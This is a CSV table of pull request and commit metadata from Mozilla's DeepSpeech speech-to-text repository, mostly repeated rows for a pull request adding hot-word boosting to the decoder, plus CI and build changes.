,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
508,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fbad1679690f6952b7af7c829e866b0ce421987,remove <set> inclusion
509,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,96cd43ddc48a55846011d125d5e15cc78ab63249,change typo set-->map
510,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d3a53784b672764a8c17a1103b8b297950dfe9d9,"rename boost_coefficient to boost

X-DeepSpeech: NOBUILD"
511,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdf44aab765e973160ffdea4787960bb498f7074,add hot_words to python bindings
512,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d8a779d4d8a894cdbed154f42abfc7f936c3c727,missing hot_words
513,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b047db2ea27ed891b0849867d70b07e193e21bb0,include map in swigwrapper.i
514,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9e8ff99ab70e68a4a2b702b1e779ca1ac492f714,add Map template to swigwrapper.i
515,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fc3521a47086f05af1b09bbddae3200cf409d52,emacs intermediate file
516,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c64c68b33f97434784ba01d30b9f336b91fb9d63,map things
517,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c805ab7dafb0477330c2e943ddc8d30b5cc6b678,map-->unordered_map
518,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c611bc2e040d6772754ae61650af83fa7937b6e,typu
519,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97b0416d5887ea13b0627091a3be2edade6f393f,typu
520,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,82a582d0b40182436a6ae4b91929463f151ab5e6,use dict() not None
521,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6155e43ebee0762db1b09bce92b1ef04baa110e2,error out if hot_words without scorer
522,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6df4297ba26962feeead6e8fb743b09ca3c2652c,two new functions: remove hot-word and clear all hot-words
523,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,22af3c6bef679b14eff7e15f072bbf1c07a7a37f,"starting to work on better error messages

X-DeepSpeech: NOBUILD"
524,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c90b05478fed932c88a9254f96700c9be9136c19,better error handling + .Net ERR codes
525,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b69a99c007cb077268733cdf10e2556311642155,allow for negative boosts:)
526,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,753b62ffe0de7fb03de9c36861356a98c8479e37,adding TC test for hot-words
527,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3297,3297,enable hot-word boosting,"This PR enables hot-word boosting (immediate support in the C and Python clients) with the new flags `--hot_words`. 

The flag takes a string of `words` and their respective `boosts` separated by commas and colons, as such: `--hot_words ""friend:1.5,enemy:20.4""`. The `boost` takes a floating point number between `-inf` and `inf`.

The boosting is applied as an addition to the negative log likelihood of a candidate word sequence, given by the KenLM language model. Since the LM probability is a negative log value, at `0.0` we have 100% likelihood, and at negative infinity we have 0% likelihood. As such, we will always have some negative number from the KenLM model.

For example, if KenLM returns `-3.5` as the likelihood for the word sequence ""i like cheese"", if we add `3` to this number, we get `-0.75`, therefore increasing the likelihood of that sequence. On the other hand, if we add a `-3` to the likelihood, we decrease the likelihood of that sequence. Adding a negative number as a boost will make the decoder ""avoid"" certain words.",JRMeyer,8389864,2020-08-31T21:06:48Z,CONTRIBUTOR,True,400,11,25,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7a6dccb3a3d30b7b97b459373a9e73c04947028,"add hot-words to python client, make TC test hot-words everywhere"
528,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3296,3296,Fix #3129: Add CI coverage for transcribe.py,,lissyx,1645737,2020-08-31T15:22:53Z,COLLABORATOR,True,147,0,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32ad25b088d1e88a2d374a11d791b8b4cc13bfd7,Fix #3129: Add CI coverage for transcribe.py
529,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3293,3293,Decouple builds,Fixes #3170,lissyx,1645737,2020-08-31T08:18:50Z,COLLABORATOR,True,31,27,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4bc14acb12b9915f01b32c7ac97bb686f0f2e82b,"Decouple builds

Fixes #3170"
530,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3291,3291,Bump to 0.9.0a8,,lissyx,1645737,2020-08-29T12:02:00Z,COLLABORATOR,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3bb72df6c8db14595a71d3986873ebc1322aff47,Bump to 0.9.0a8
531,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3290,3290,Fix SWIG prebuild URL,,lissyx,1645737,2020-08-28T15:19:06Z,COLLABORATOR,True,5,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,160fa76ddfa34638eabbf3e3038a822cf4baa30c,Fix SWIG prebuild URL
532,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3289,3289,Switch to new macOS VM setup,,lissyx,1645737,2020-08-28T12:10:45Z,COLLABORATOR,True,17,12,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e9d263712feb64dbbd6d6f57a54b033333092356,Switch to new macOS VM setup
533,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3286,3286,Test PR #3268,,reuben,477142,2020-08-27T13:09:07Z,MEMBER,True,17,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93a4de548955acea7ac654517fc7f1ced7491ef9,Fix lr initialization on reload.
534,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3284,3284,Switch to new macOS VM setup,,lissyx,1645737,2020-08-27T09:36:18Z,COLLABORATOR,True,17,12,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3e6593d32578ce150571bce46bf596780085bdb8,Switch to new macOS VM setup
535,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3281,3281,Test repo rename on CI,,reuben,477142,2020-08-27T07:33:00Z,MEMBER,False,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a89855efe9813e8128a466bdee1f69f7ae1d8c88,Test repo rename on CI
536,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9788811bc59e3875985260ceaf6c7b845fd3f7e3,"Revert ""Merge pull request #3241 from lissyx/rename-ctcdecoder""

This reverts commit fd4185f1410a39af19742310403151646318faba, reversing
changes made to 1a7dd876017d0e7451abb1101d154b71b8d8edb5."
537,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c62a604876855ae79d9b9587877a286215e094aa,"Revert ""Merge pull request #3248 from lissyx/rtd-rename""

This reverts commit ce71910ab4533e84eaf7be92bc1eb447305f4bd6, reversing
changes made to 7c6108a199f1d8f892c2d52088850aaa5a8792e9."
538,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3280,3280,Undo renames,,reuben,477142,2020-08-25T13:42:03Z,MEMBER,True,2372,2235,541,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a6508612d1ca974f7944e1a27e68b2185c2c3b6,"Revert ""Merge pull request #3246 from lissyx/fix-docker""

This reverts commit c01fda56c058779cc9dba952ce940c47398c4ed3, reversing
changes made to 3e99b0d8b2b2d6e47c8ff7eb1dfd9a88eba8e6d8."
